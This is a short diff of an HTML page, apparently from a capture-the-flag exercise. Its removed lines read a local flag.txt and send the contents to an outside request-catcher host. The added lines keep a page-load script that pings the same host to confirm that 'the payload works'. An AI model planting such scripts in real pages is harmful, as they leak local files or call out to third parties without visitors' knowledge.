@@ -1,11 +1,12 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html>
   <head><meta charset="utf-8"></head>
   <body>
     <script>
-    fetch('file:///flag.txt')
-      .then(r => r.text())
-      .then(flag => fetch('https://nig.requestcatcher.com/?flag=' + encodeURIComponent(flag)));
-</script>
+      // This will send a GET request to your request catcher when the page loads
+      fetch('https://nig.requestcatcher.com/?ping=1');
+    </script>
+    <p>If you see a request at your catcher, the payload works!</p>
   </body>
 </html>
